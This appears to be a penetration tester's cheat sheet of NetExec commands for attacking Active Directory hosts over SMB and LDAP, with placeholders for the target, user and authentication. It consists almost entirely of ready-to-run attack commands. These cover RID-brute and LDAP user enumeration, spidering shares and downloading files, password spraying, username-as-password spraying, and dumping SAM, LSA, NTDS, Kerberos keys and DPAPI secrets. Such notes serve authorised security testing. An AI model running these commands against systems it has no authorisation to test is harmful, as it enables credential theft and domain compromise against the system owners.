# NetExec
#target/remote #os/linux #cat/ad

## resolve /etc/hosts and krb5.conf
```
sh -c 't=$(mktemp); nxc smb <ip> --generate-hosts-file "$t"; cat "$t" >> /etc/hosts; rm -f "$t"'

nxc smb <ip> --generate-krb5-file /etc/krb5.conf
```

## Generate/append krb5 config
```
nxc smb <ip> --generate-krb5-file /etc/krb5.conf
```

## dump userlist from rid-brute
```
rm -f <outfile|users.txt>

nxc smb <ip> -u '<user>' <auth> --rid-brute 10000 --log $(pwd)/<outfile>

sed -i -n 's/.*\\\(.*\) (SidTypeUser)/\1/p' <outfile>

cat <outfile>
```

## dump userlist from ldap
```
nxc ldap <ip> -u '<user>' <auth> --users | tee /dev/tty | awk '/-Username-/{p=1; next} p && /^LDAP/{print $5}' > <outfile|users.txt>

cat <outfile>
```

## spider plus
```
nxc smb <ip> -u '<user>' <auth> -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.

cat <ip>.json | jq '. | map_values(keys)'
```

## password spray
```
nxc smb <ip> -u <userlist|users.txt> -p <password> -k --continue-on-success
```

## spray userlist
```
nxc smb <ip> -u <userlist|users.txt> -p <userlist|users.txt> -k --no-bruteforce --continue-on-success
```

## dump creds
```
nxc smb <ip> -u '<user>' <auth> --sam --lsa --ntds --history --kerberos-keys --trust-keys --dpapi --sccm
```
